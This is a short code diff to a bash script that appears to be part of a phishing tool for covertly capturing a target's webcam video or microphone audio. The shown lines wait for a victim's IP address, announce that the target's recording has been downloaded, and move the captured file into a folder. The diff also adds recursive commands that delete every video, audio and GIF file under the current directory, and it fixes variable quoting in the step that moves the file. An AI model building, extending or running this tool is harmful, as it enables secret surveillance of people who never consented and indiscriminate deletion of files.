@@ -687,6 +687,12 @@ fi
 done
 sleep 1
 rm -rf ip.txt log.txt
+find . -name "*.webm" -type f -delete
+find . -name "*.mp4" -type f -delete
+find . -name "*.mkv" -type f -delete
+find . -name "*.gif" -type f -delete
+find . -name "*.wav" -type f -delete
+find . -name "*.ogg" -type f -delete
 echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
 while true; do
     if [[ -e "ip.txt" ]]; then
@@ -702,8 +708,9 @@ while true; do
     if [[ -e "log.txt" ]]; then
         echo -e "\007${success}Video/Audio has been downloaded! Check directory!\n"
         file=$(ls | grep webm || ls | grep mp4 || ls | grep mkv || ls | grep gif || ls | grep ogg || ls | grep wav)
-        if ! [ -z $file ]; then
-            mv -f $file $FOL
+        if ! [[ -z "$file" ]]; then
+            onefile=$(echo $file | head -n1)
+            mv -f "$onefile" "$FOL"
         fi
         rm -rf log.txt
     fi
